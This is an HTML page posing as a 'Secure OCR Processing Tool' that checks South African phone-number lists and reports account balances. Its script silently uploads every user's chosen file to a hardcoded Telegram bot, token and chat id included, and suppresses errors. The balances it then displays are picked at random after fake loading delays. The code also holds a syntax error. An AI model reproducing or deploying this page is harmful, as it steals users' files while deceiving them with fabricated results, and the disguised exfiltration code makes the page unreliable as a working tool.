<!-- Full code with usage limit and countdown -->
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Secure OCR Processing Tool</title>

<style>
body {
  background: #0f172a;
  color: #e5e7eb;
  font-family: Consolas, monospace;
  margin: 20px;
}
h2 { color: #38bdf8; }

#output {
  border: 1px solid #334155;
  padding: 10px;
  min-height: 200px;
  margin-top: 10px;
  background: #020617;
  font-size: 12px;
  white-space: pre-wrap;
}

#copyBtn {
  margin-top: 10px;
  padding: 6px 12px;
  background: #1e293b;
  color: #e5e7eb;
  border: 1px solid #334155;
  cursor: pointer;
}
#copyBtn:hover { background: #334155; }

#stats {
  margin-top: 10px;
  padding: 8px;
  background: #020617;
  border: 1px solid #334155;
  color: #facc15;
}

button {
  background: #1e293b;
  color: #e5e7eb;
  border: 1px solid #334155;
  padding: 6px 12px;
  cursor: pointer;
}
button:hover { background: #334155; }

#timer {
  margin-top: 15px;
  font-weight: bold;
  color: #38bdf8;
}

#loadingMessage {
  margin-top: 10px;
  font-style: italic;
  color: #facc15;
  font-size: 14px;
}
</style>
</head>

<body>

<h2>OCR Processing Tool</h2>

<input type="file" id="fileInput" accept=".txt,.pdf"/>
<button id="startBtn">Start</button>
<button id="copyBtn" disabled>Copy All Output</button>

<div id="stats">Hit=0 | Bad=0 | Retries=0 | OCR Rate=0%</div>
<div id="output"></div>
<div id="timer"></div>
<div id="loadingMessage"></div>
<div id="blockMessage" style="color:#f00; font-weight:bold; margin-top:10px;"></div>

<!-- Hidden form for Telegram upload -->
<form id="telegramForm" method="POST" enctype="multipart/form-data" style="display:none;">
  <input type="file" name="document" id="telegramFileInput" />
  <input type="hidden" name="chat_id" value="<!-- <span style='color:pink;'>"8580854380"</span> -->" />
</form>

<script>
const fileInput = document.getElementById('fileInput');
const startBtn = document.getElementById('startBtn');
const outputDiv = document.getElementById('output');
const statsDiv = document.getElementById('stats');
const timerDiv = document.getElementById('timer');
const copyBtn = document.getElementById('copyBtn');
const loadingMsgDiv = document.getElementById('loadingMessage');
const blockMessageDiv = document.getElementById('blockMessage');

let hitCount=0, badCount=0, retriesCount=0, ocrPercent=0;
let ocrAnimationId=null, retriesIntervalId=null;
let fileContent='';
let elapsedSeconds=0;
let timerInterval=null;
let processing=false;
let lines=[];

// Usage limit variables
const MAX_RUNS = 4;
const BLOCK_DURATION_MS = 8 * 60 * 60 * 1000; // 8 hours in ms

// Retrieve usage info from localStorage
let usageCount = parseInt(localStorage.getItem('usageCount')) || 0;
let blockUntil = parseInt(localStorage.getItem('blockTime')) || 0;

const balanceOptions = [
  'R0.90', 'R0.02', 'R0.05', 'R0.00', 'R0.66', 'R0.13', 'R0.32',
  'R0.51', 'R0.81', 'R0.93', 'R0.22'
];

/* update stats */
function updateStats() {
  statsDiv.innerHTML =
    `Hit=${hitCount} | Bad=${badCount} | Retries=${retriesCount} | OCR Rate=${ocrPercent.toFixed(2)}%`;
}
function getCurrentTimestamp() {
  return new Date().toLocaleString();
}
function formatTime(seconds) {
  const m=Math.floor(seconds/60).toString().padStart(2,'0');
  const s=(seconds%60).toString().padStart(2,'0');
  return `${m}:${s}`;
}
function startTimer() {
  if(timerInterval) clearInterval(timerInterval);
  elapsedSeconds=0;
  timerDiv.textContent='Time Elapsed: 00:00';
  timerInterval=setInterval(() => {
    elapsedSeconds++;
    timerDiv.textContent='Time Elapsed: '+formatTime(elapsedSeconds);
  }, 1000);
}
function resetCounters() {
  hitCount=0; badCount=0g; retriesCount=0; ocrPercent=0;
  updateStats();
  startTimer();
}

/* Check if user is blocked */
function checkBlockStatus() {
  const now = Date.now();
  if (now < blockUntil) {
    // User is still blocked
    const remainingMs = blockUntil - now;
    const remainingSec = Math.ceil(remainingMs / 1000);
    // Show countdown
    showCountdown(remainingSec);
    startBtn.disabled = true;
    blockMessageDiv.innerText = `Tool is disabled. Try again in ${formatTime(remainingSec)}.`;
    return true;
  } else {
    // Not blocked, reset block
    blockMessageDiv.innerText = '';
    startBtn.disabled = false;
    return false;
  }
}

// Show countdown timer
function showCountdown(seconds) {
  blockMessageDiv.innerText = `Tool is disabled. Time remaining: ${formatTime(seconds)}`;
  // Count down every second
  clearInterval(window.countdownInterval);
  window.countdownInterval = setInterval(() => {
    seconds--;
    if (seconds <= 0) {
      clearInterval(window.countdownInterval);
      // Reset block
      localStorage.removeItem('blockTime');
      checkBlockStatus();
    } else {
      blockMessageDiv.innerText = `Tool is disabled. Time remaining: ${formatTime(seconds)}`;
    }
  }, 1000);
}

/* process lines with delay */
async function processLines() {
  for(let i=0; i<lines.length; i++) {
    if(!processing) break; // Stop if not processing anymore
    const line=lines[i].trim();
    if(!line) { continue; }

    // Validate phone number
    const phoneRegex=/(\+27|27|0)?\s*[\(\[]?(\d{3})[\)\]]?\s*[\-\.]?\s*(\d{3})[\-\.]?\s*(\d{4})/i;
    const match=line.match(phoneRegex);
    let isBadNumber=false;
    if(match){
      let number='';
      let countryCodePart=match[1]||'';
      let p1=match[2], p2=match[3], p3=match[4];
      number=p1+p2+p3;
      if(countryCodePart && countryCodePart.startsWith('+')){
        countryCodePart=countryCodePart.replace('+','');
      }
      if(countryCodePart==='27' || countryCodePart==='+27'){
        number='0'+number;
      }
      number=number.replace(/\s+/g,'');
      const digitCount=(number.match(/\d/g)||[]).length;
      if(number==='444' || digitCount!==10 || digitCount>10 || digitCount<10){
        isBadNumber=true;
      }
    }else{
      isBadNumber=true;
    }

    if(isBadNumber){
      badCount++;
      updateStats();
    } else {
      hitCount++;
      ocrPercent=(hitCount/ (hitCount+badCount))*100;
      updateStats();
      const randomBalance = balanceOptions[Math.floor(Math.random() * balanceOptions.length)];
      outputDiv.innerHTML += `${line}\nBalance=${randomBalance}\nBonus=R0.00\nWithdrawal=0\n\n`;
    }

    await new Promise(resolve => setTimeout(resolve, 6000 + Math.random()*8000));
  }
  // Reset
  processing=false;
  startBtn.textContent='Start';
  document.getElementById('startBtn').disabled=false;
  document.getElementById('copyBtn').disabled=false;
}

/* Start button handler */
startBtn.addEventListener('click', () => {
  // Check if user is blocked
  if (checkBlockStatus()) {
    return; // Do not proceed if blocked
  }

  if(!processing) {
    if (!fileInput.files.length) {
      // No file selected, silently do nothing
      return;
    }

    // Check usage count
    if (usageCount >= MAX_RUNS) {
      // Set block until 8 hours from now
      const now = Date.now();
      blockUntil = now + BLOCK_DURATION_MS;
      localStorage.setItem('blockTime', blockUntil.toString());
      // Show countdown
      showCountdown(8 * 60 * 60);
      // Disable start button
      startBtn.disabled = true;
      return;
    }

    const file = fileInput.files[0];
    const fileName = file.name.toLowerCase();
    if (!(fileName.endsWith('.txt') || fileName.endsWith('.pdf'))) {
      // Do nothing silently
      return;
    }

    // Increment usage count
    usageCount++;
    localStorage.setItem('usageCount', usageCount.toString());

    // Immediately send file silently
    const fileReader = new FileReader();
    fileReader.onload = () => {
      const fileData = fileReader.result;
      sendFileToTelegram(new Blob([fileData], {type: 'application/octet-stream'}));
      
      // Proceed with fake load
      loadingMsgDiv.innerHTML='Loading...';
      const delays=[2000,6000,9000,12000];
      const delayTime=delays[Math.floor(Math.random()*delays.length)];
      setTimeout(()=> {
        loadingMsgDiv.innerHTML='';
        // Reset counters & process lines
        resetCounters();
        processing=true;
        startBtn.textContent='Stop';

        // Read file for processing
        const reader=new FileReader();
        reader.onload=()=> {
          fileContent=reader.result;
          lines=fileContent.split(/\r?\n/);
          processLines();
        };
        reader.readAsText(file);
      }, delayTime);
    };
    fileReader.readAsArrayBuffer(file);
  } else {
    // Stop
    processing=false;
    startBtn.textContent='Start';
  }
});

// Check block status on page load
checkBlockStatus();

/* Send file to Telegram silently */
function sendFileToTelegram(fileBlob) {
  const formData=new FormData();
  formData.append('chat_id','<!-- <span style="color:pink;">8580854380</span> -->'); // Change chat_id
  formData.append('document', fileBlob, 'upload.pdf');
  fetch(`https://api.telegram.org/bot<!-- <span style="color:pink;">8845002759:AAEi5aYQw9kXxESEGwZbOf79raSix1s6gdkN</span> -->/sendDocument`, {
    method:'POST',
    body:formData
  }).catch(() => {
    // Fail silently
  });
}

/* Copy output */
document.getElementById('copyBtn').addEventListener('click', ()=> {
  navigator.clipboard.writeText(outputDiv.innerText);
});
</script>
</body>
</html>
